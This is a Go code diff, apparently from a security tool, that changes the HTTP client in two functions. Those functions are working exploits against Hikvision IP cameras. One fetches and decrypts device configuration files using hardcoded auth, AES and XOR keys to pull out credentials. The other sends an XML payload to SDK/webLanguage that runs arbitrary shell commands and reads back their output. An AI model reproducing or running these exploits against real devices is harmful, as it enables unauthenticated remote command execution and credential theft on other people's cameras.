@@ -7,7 +7,6 @@ import (
 	"encoding/hex"
 	"errors"
 	"fmt"
-	"net/http"
 	"regexp"
 	"slack-wails/lib/clients"
 	"slack-wails/lib/gologger"
@@ -15,6 +14,7 @@ import (
 	"time"
 
 	"github.com/chromedp/chromedp"
+	"github.com/go-resty/resty/v2"
 )
 
 // ZeroPadding pads byte array to block size with zero
@@ -72,37 +72,37 @@ func FilterStrings(data string) []string {
 	return pattern.FindAllString(data, -1)
 }
 
-func CVE_2017_7921(url string, client *http.Client) string {
+func CVE_2017_7921(url string, client *resty.Client) string {
 	var result string
 	// 解密配置文件
-	_, body, err := clients.NewSimpleGetRequest(url+"/System/configurationFile?auth=YWRtaW46MTEK", client)
+	resp, err := clients.SimpleGet(url+"/System/configurationFile?auth=YWRtaW46MTEK", client)
 	if err != nil {
 		return err.Error()
 	}
 	key, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
 	xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
-	decrypted := AesDecrypt(body, key)
+	decrypted := AesDecrypt(resp.Body(), key)
 	resultList := FilterStrings(string(xore(decrypted, xorKey)))
 
 	result = fmt.Sprintf("[+] 配置文件解密结果: \n%s\n\n[+] 快照地址: %s", strings.Join(resultList, "  "), url+"/onvif-http/snapshot?auth=YWRtaW46MTEK")
 	return result
 }
 
-func CVE_2021_36260(url, cmd string, client *http.Client) string {
+func CVE_2021_36260(url, cmd string, client *resty.Client) string {
 	h := map[string]string{
 		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
 	}
 	body := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(%s>webLib/x)</language>`, cmd)
-	resp, _, err := clients.NewRequest("PUT", url+"SDK/webLanguage", h, strings.NewReader(body), 10, false, client)
+	resp, err := clients.DoRequest("PUT", url+"SDK/webLanguage", h, strings.NewReader(body), 10, client)
 	if err != nil {
 		return err.Error()
 	}
-	if resp.StatusCode == 200 {
-		_, content, err := clients.NewSimpleGetRequest(url+"x", client)
+	if resp.StatusCode() == 200 {
+		resp, err := clients.SimpleGet(url+"x", client)
 		if err != nil {
 			return err.Error()
 		}
-		return string(content)
+		return string(resp.Body())
 	}
 	return "[-] 不存在CVE-2021-36260"
 }
